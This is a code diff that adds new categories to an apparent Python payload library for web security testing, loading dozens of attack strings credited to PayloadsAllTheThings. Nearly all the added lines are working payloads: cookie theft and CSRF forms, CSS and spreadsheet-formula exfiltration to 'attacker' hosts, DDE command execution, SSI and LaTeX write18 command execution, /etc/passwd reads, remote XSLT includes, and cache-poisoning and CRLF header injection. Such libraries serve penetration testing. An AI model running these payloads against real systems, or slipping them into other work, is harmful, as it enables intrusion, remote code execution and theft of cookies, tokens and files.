@@ -60,6 +60,12 @@ class PayloadCategory(Enum):
     PROMPT_INJECTION = auto()  # AI/LLM
     DIRECTORY_DISCOVERY = auto()
     PASSWORD_SPRAY = auto()
+    # Additional categories from PayloadsAllTheThings
+    CSS_INJECTION = auto()
+    CSV_INJECTION = auto()
+    SSI = auto()  # Server Side Include
+    LATEX_INJECTION = auto()
+    XSLT_INJECTION = auto()
 
 
 @dataclass
@@ -155,6 +161,16 @@ class PayloadLibrary:
         self._load_request_smuggling_payloads()
         self._load_directory_discovery_payloads()
         self._load_prompt_injection_payloads()
+        # New categories from PayloadsAllTheThings
+        self._load_csrf_payloads()
+        self._load_css_injection_payloads()
+        self._load_csv_injection_payloads()
+        self._load_ssi_payloads()
+        self._load_latex_injection_payloads()
+        self._load_xslt_injection_payloads()
+        self._load_http_param_pollution_payloads()
+        self._load_websocket_payloads()
+        self._load_web_cache_payloads()
     
     # ===================== NoSQL Injection (from PayloadsAllTheThings) =====================
     def _load_nosql_payloads(self):
@@ -1159,6 +1175,238 @@ class PayloadLibrary:
             self.payloads.append(EnhancedPayload(
                 name=f"prompt_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
                 category=PayloadCategory.PROMPT_INJECTION,
+                raw=raw,
+                description=desc,
+                source="PayloadsAllTheThings",
+                risk_level=risk
+            ))
+    
+    # ===================== CSRF (Cross-Site Request Forgery) =====================
+    def _load_csrf_payloads(self):
+        """CSRF payloads - form and request templates."""
+        payloads = [
+            ('<form action="TARGET" method="POST"><input type="hidden" name="param" value="value"/><input type="submit"/></form>', "Basic CSRF form", "high"),
+            ('<img src="TARGET?action=delete&id=1" style="display:none"/>', "GET CSRF via img", "high"),
+            ('<script>fetch("TARGET",{method:"POST",credentials:"include",body:"data"})</script>', "Fetch CSRF", "critical"),
+            ('<iframe style="display:none" name="csrf"><form target="csrf" action="TARGET" method="POST"></form></iframe>', "Iframe CSRF", "high"),
+            ('XMLHttpRequest CSRF with withCredentials', "XHR CSRF marker", "high"),
+            ('<body onload="document.forms[0].submit()">', "Auto-submit form", "high"),
+            ('<script>new Image().src="TARGET?"+document.cookie</script>', "Cookie steal via img", "critical"),
+        ]
+        
+        for raw, desc, risk in payloads:
+            self.payloads.append(EnhancedPayload(
+                name=f"csrf_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
+                category=PayloadCategory.CSRF,
+                raw=raw,
+                description=desc,
+                source="PayloadsAllTheThings",
+                risk_level=risk
+            ))
+    
+    # ===================== CSS Injection =====================
+    def _load_css_injection_payloads(self):
+        """CSS Injection payloads for data exfiltration."""
+        payloads = [
+            ('input[value^="a"]{background:url(http://attacker/?a)}', "CSS attribute selector exfil", "high"),
+            ('@import url("http://attacker/steal.css");', "CSS import", "high"),
+            ('*{background:url("http://attacker/?"+attr(value))}', "CSS attr() exfil", "high"),
+            ('input[name=csrf][value^="a"]{background:url(//evil/a)}', "CSRF token exfil", "critical"),
+            ('</style><script>alert(1)</script>', "Style tag escape", "high"),
+            ('@font-face{font-family:poc;src:url(//attacker)}', "Font-face exfil", "medium"),
+            ('body{behavior:url(script.htc)}', "HTC behavior (IE)", "high"),
+            ('-moz-binding:url(//attacker/xss.xml#xss)', "Firefox XBL", "high"),
+            ('expression(alert(1))', "IE expression()", "high"),
+        ]
+        
+        for raw, desc, risk in payloads:
+            self.payloads.append(EnhancedPayload(
+                name=f"css_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
+                category=PayloadCategory.CSS_INJECTION,
+                raw=raw,
+                description=desc,
+                source="PayloadsAllTheThings",
+                risk_level=risk
+            ))
+    
+    # ===================== CSV Injection =====================
+    def _load_csv_injection_payloads(self):
+        """CSV/Formula Injection payloads."""
+        payloads = [
+            ('=cmd|"/C calc"!A0', "CMD execution via DDE", "critical"),
+            ('=HYPERLINK("http://attacker/?leak="&A1,"Click")', "Data exfil hyperlink", "high"),
+            ('+cmd|"/C notepad"!A0', "Plus prefix DDE", "critical"),
+            ('-cmd|"/C whoami > output.txt"!A0', "Minus prefix DDE", "critical"),
+            ('@SUM(1+1)*cmd|"/C calc"!A0', "At prefix DDE", "critical"),
+            ('=IMPORTXML("http://attacker","//")', "Google Sheets import", "high"),
+            ('=IMPORTDATA("http://attacker/?d="&A1)', "Import data exfil", "high"),
+            ('=1+1+cmd|"/C powershell IEX"!A0', "Obfuscated DDE", "critical"),
+            ("|cmd|'/C calc'!A0", "Pipe prefix DDE", "critical"),
+            ('%0A=cmd|"/C calc"!A0', "Newline bypass DDE", "critical"),
+        ]
+        
+        for raw, desc, risk in payloads:
+            self.payloads.append(EnhancedPayload(
+                name=f"csv_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
+                category=PayloadCategory.CSV_INJECTION,
+                raw=raw,
+                description=desc,
+                source="PayloadsAllTheThings",
+                risk_level=risk
+            ))
+    
+    # ===================== SSI (Server Side Include) =====================
+    def _load_ssi_payloads(self):
+        """Server Side Include injection payloads."""
+        payloads = [
+            ('<!--#exec cmd="id"-->', "SSI exec command", "critical"),
+            ('<!--#exec cmd="cat /etc/passwd"-->', "SSI read passwd", "critical"),
+            ('<!--#include file="/etc/passwd"-->', "SSI include file", "critical"),
+            ('<!--#include virtual="/etc/passwd"-->', "SSI virtual include", "critical"),
+            ('<!--#echo var="DOCUMENT_ROOT"-->', "SSI echo var", "medium"),
+            ('<!--#config errmsg="Error"-->', "SSI config error", "low"),
+            ('<!--#printenv-->', "SSI print environment", "high"),
+            ('<!--#set var="x" value="y"-->', "SSI set variable", "medium"),
+            ('<!--#exec cgi="/cgi-bin/script"-->', "SSI exec CGI", "critical"),
+            ('<!--#flastmod file="index.html"-->', "SSI file lastmod", "low"),
+        ]
+        
+        for raw, desc, risk in payloads:
+            self.payloads.append(EnhancedPayload(
+                name=f"ssi_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
+                category=PayloadCategory.SSI,
+                raw=raw,
+                description=desc,
+                source="PayloadsAllTheThings",
+                risk_level=risk
+            ))
+    
+    # ===================== LaTeX Injection =====================
+    def _load_latex_injection_payloads(self):
+        """LaTeX injection payloads for RCE and file read."""
+        payloads = [
+            (r'\input{/etc/passwd}', "LaTeX read file", "critical"),
+            (r'\include{/etc/passwd}', "LaTeX include file", "critical"),
+            (r'\immediate\write18{id}', "LaTeX RCE write18", "critical"),
+            (r'\immediate\write18{cat /etc/passwd > output}', "LaTeX RCE dump", "critical"),
+            (r'\usepackage{verbatim}\verbatiminput{/etc/passwd}', "Verbatim file read", "critical"),
+            (r'\newread\file\openin\file=/etc/passwd\read\file to\line\text{\line}', "LaTeX newread", "critical"),
+            (r'\catcode`\\=12\input|"id"', "LaTeX catcode bypass", "critical"),
+            (r'$\lstinputlisting{/etc/passwd}$', "Listings package", "critical"),
+            (r'\url{http://attacker/?d=\input{/etc/passwd}}', "URL package exfil", "high"),
+            (r'\href{http://attacker}{click}', "Hyperref link", "medium"),
+        ]
+        
+        for raw, desc, risk in payloads:
+            self.payloads.append(EnhancedPayload(
+                name=f"latex_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
+                category=PayloadCategory.LATEX_INJECTION,
+                raw=raw,
+                description=desc,
+                source="PayloadsAllTheThings",
+                risk_level=risk
+            ))
+    
+    # ===================== XSLT Injection =====================
+    def _load_xslt_injection_payloads(self):
+        """XSLT injection payloads for XXE and RCE."""
+        payloads = [
+            ('<xsl:value-of select="document(\'/etc/passwd\')"/>', "XSLT read file", "critical"),
+            ('<xsl:value-of select="system-property(\'xsl:vendor\')"/>', "XSLT version info", "low"),
+            ('<xsl:copy-of select="document(\'http://attacker/xxe\')"/>', "XSLT SSRF", "high"),
+            ('<xsl:variable name="rtobject" select="runtime:getRuntime()"/>', "Java runtime access", "critical"),
+            ('<xsl:value-of select="php:function(\'file_get_contents\',\'/etc/passwd\')"/>', "PHP function call", "critical"),
+            ('<xsl:value-of select="unparsed-entity-uri(\'xxe\')"/>', "XSLT XXE", "critical"),
+            ('<xsl:include href="http://attacker/malicious.xsl"/>', "XSLT include remote", "critical"),
+            ('<xsl:import href="http://attacker/malicious.xsl"/>', "XSLT import remote", "critical"),
+            ('xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"', "Xalan Java namespace", "critical"),
+            ('<redirect:write file="/tmp/pwned">data</redirect:write>', "XSLT file write", "critical"),
+        ]
+        
+        for raw, desc, risk in payloads:
+            self.payloads.append(EnhancedPayload(
+                name=f"xslt_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
+                category=PayloadCategory.XSLT_INJECTION,
+                raw=raw,
+                description=desc,
+                source="PayloadsAllTheThings",
+                risk_level=risk
+            ))
+    
+    # ===================== HTTP Parameter Pollution =====================
+    def _load_http_param_pollution_payloads(self):
+        """HTTP Parameter Pollution payloads."""
+        payloads = [
+            ('param=value1&param=value2', "Duplicate parameter", "medium"),
+            ('param[]=value1&param[]=value2', "Array parameter", "medium"),
+            ('param=value1%26param=value2', "Encoded ampersand", "medium"),
+            ('action=view&action=delete', "Action override", "high"),
+            ('id=1&id=2&id=3', "Multiple ID injection", "high"),
+            ('callback=safe&callback=evil', "Callback override", "high"),
+            ('redirect=safe.com&redirect=evil.com', "Redirect HPP", "high"),
+            ('file=safe.txt&file=../../etc/passwd', "File path HPP", "critical"),
+            ('user=admin&user=attacker', "User override HPP", "critical"),
+            ('price=100&price=1', "Price manipulation HPP", "high"),
+        ]
+        
+        for raw, desc, risk in payloads:
+            self.payloads.append(EnhancedPayload(
+                name=f"hpp_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
+                category=PayloadCategory.HTTP_PARAM_POLLUTION,
+                raw=raw,
+                description=desc,
+                source="PayloadsAllTheThings",
+                risk_level=risk
+            ))
+    
+    # ===================== WebSocket =====================
+    def _load_websocket_payloads(self):
+        """WebSocket security testing payloads."""
+        payloads = [
+            ('{"type":"auth","token":"admin"}', "Auth bypass attempt", "high"),
+            ('{"__proto__":{"admin":true}}', "Prototype pollution via WS", "critical"),
+            ('{"action":"subscribe","channel":"../admin"}', "Channel traversal", "high"),
+            ('{"message":"<script>alert(1)</script>"}', "XSS via WebSocket", "high"),
+            ('{"query":"query{__schema{types{name}}}"}', "GraphQL introspection WS", "medium"),
+            ('PING\\x00PONG', "Binary frame injection", "medium"),
+            ('{"user":"admin","role":"*"}', "Wildcard role", "high"),
+            ('{"cmd":"eval","code":"process.exit()"}', "Code eval via WS", "critical"),
+            ('{"action":"read","path":"/etc/passwd"}', "File read via WS", "critical"),
+            ('Connection: Upgrade\\r\\nUpgrade: websocket\\r\\nOrigin: evil.com', "CSWSH origin", "high"),
+        ]
+        
+        for raw, desc, risk in payloads:
+            self.payloads.append(EnhancedPayload(
+                name=f"ws_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
+                category=PayloadCategory.WEBSOCKET,
+                raw=raw,
+                description=desc,
+                source="PayloadsAllTheThings",
+                risk_level=risk
+            ))
+    
+    # ===================== Web Cache Poisoning/Deception =====================
+    def _load_web_cache_payloads(self):
+        """Web Cache Poisoning and Deception payloads."""
+        payloads = [
+            ('X-Forwarded-Host: evil.com', "Host header poisoning", "high"),
+            ('X-Original-URL: /admin', "URL override header", "high"),
+            ('X-Rewrite-URL: /admin', "Rewrite URL header", "high"),
+            ('X-Forwarded-Scheme: http', "Scheme downgrade", "medium"),
+            ('/page.html%2f..%2fadmin', "Path normalization", "high"),
+            ('/page.html%00.js', "Null byte extension", "high"),
+            ('Accept-Language: en, x]<script>alert(1)</script>', "Header XSS cache", "high"),
+            ('GET /api/../admin HTTP/1.1', "Path traversal cache", "high"),
+            ('X-HTTP-Method-Override: DELETE', "Method override", "high"),
+            ('Cache-Control: no-transform', "Cache directive bypass", "medium"),
+            ('/sensitive-page.css', "CSS extension deception", "medium"),
+            ('/admin%20HTTP/1.1%0D%0AX-Injected: header', "CRLF cache poison", "critical"),
+        ]
+        
+        for raw, desc, risk in payloads:
+            self.payloads.append(EnhancedPayload(
+                name=f"cache_{hashlib.md5(raw.encode()).hexdigest()[:8]}",
+                category=PayloadCategory.WEB_CACHE,
                 raw=raw,
                 description=desc,
                 source="PayloadsAllTheThings",
